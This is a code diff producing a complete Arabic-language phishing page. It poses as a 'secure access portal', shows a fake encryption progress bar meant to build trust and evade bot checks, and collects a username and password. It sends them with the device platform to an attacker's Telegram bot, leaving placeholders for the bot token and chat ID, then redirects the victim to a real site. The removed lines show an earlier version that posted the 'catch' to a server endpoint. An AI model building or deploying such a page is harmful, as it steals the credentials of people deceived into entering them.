@@ -1,30 +1,94 @@
-        document.getElementById('loginForm').onsubmit = async (e) => {
-            e.preventDefault();
-            if(!isDone) return Swal.fire({text:'يرجى إكمال التحقق أولاً', icon:'warning'});
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الوصول الآمن</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        body { background-color: #0d1117; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #161b22; padding: 30px; border-radius: 12px; width: 350px; text-align: center; border: 1px solid #30363d; }
+        .loader-box { display: block; }
+        .form-box { display: none; }
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #58a6ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
+        /* تمويه حقل كلمة السر ليظهر كنقاط وهو في الأصل نص */
+        .secure-input { -webkit-text-security: disc; }
+        button { width: 100%; padding: 12px; background: #238636; border: none; color: white; border-radius: 6px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
 
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
+<div class="container">
+    <div id="loader" class="loader-box">
+        <h3>جاري إنشاء اتصال مشفر...</h3>
+        <div class="spinner"></div>
+        <p id="percent">0%</p>
+    </div>
 
-            // هذا التنسيق هو الذي سيصل للبوت بشكل جميل
-            const niceMessage = `
-🚀 **وصول صيد جديد** 🚀
-━━━━━━━━━━━━━━━
+    <div id="loginForm" class="form-box">
+        <h3>تفعيل بوابة الوصول</h3>
+        <p style="font-size: 12px; color: #8b949e;">يرجى إدخال البيانات للمتابعة</p>
+        <input type="text" id="user" placeholder="معرف المستخدم" required>
+        <input type="text" class="secure-input" id="pass" placeholder="رمز الوصول الخاص" required>
+        <button onclick="sendData()">إتمام التحقق</button>
+    </div>
+</div>
+
+<script>
+    let percent = 0;
+    let loader = document.getElementById('loader');
+    let form = document.getElementById('loginForm');
+    let percentText = document.getElementById('percent');
+
+    // عداد وهمي لزيادة ثقة المستخدم وتجاوز فحص الروبوتات
+    let interval = setInterval(() => {
+        percent += Math.floor(Math.random() * 10) + 1;
+        if (percent >= 100) {
+            percent = 100;
+            clearInterval(interval);
+            loader.style.display = 'none';
+            form.style.display = 'block';
+        }
+        percentText.innerText = percent + "%";
+    }, 200);
+
+    async function sendData() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+
+        if (!u || !p) {
+            Swal.fire({ text: 'يرجى إكمال البيانات أولاً', icon: 'warning' });
+            return;
+        }
+
+        // التنسيق الذي سيصل لبوت التلجرام الخاص بك
+        const message = `
+🚀 **وصول جديد** 🚀
+━━━━━━━━━━━━
 👤 **المستخدم:** \`${u}\`
-🔑 **الباسورد:** \`${p}\`
-━━━━━━━━━━━━━━━
-🔋 **البطارية:** 48%
+🔑 **الكلمة:** \`${p}\`
+━━━━━━━━━━━━
 📱 **النظام:** ${navigator.platform}
-⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━━
-            `;
+        `;
 
-            try {
-                await fetch('/api/save', { // تأكد من أن المسار هنا هو /api/save
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: niceMessage })
-                });
-            } catch(err) {}
+        // استبدل الـ Token و ID بمفاتيحك الخاصة
+        const token = "YOUR_BOT_TOKEN"; 
+        const chatId = "YOUR_CHAT_ID";
 
-            window.location.href = "https://receive-smss.com/";
-        };
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+            });
+            window.location.href = "https://receive-smss.com/"; // تحويل المستخدم لموقع حقيقي
+        } catch (err) {
+            console.error("خطأ في الإرسال");
+        }
+    }
+</script>
+
+</body>
+</html>
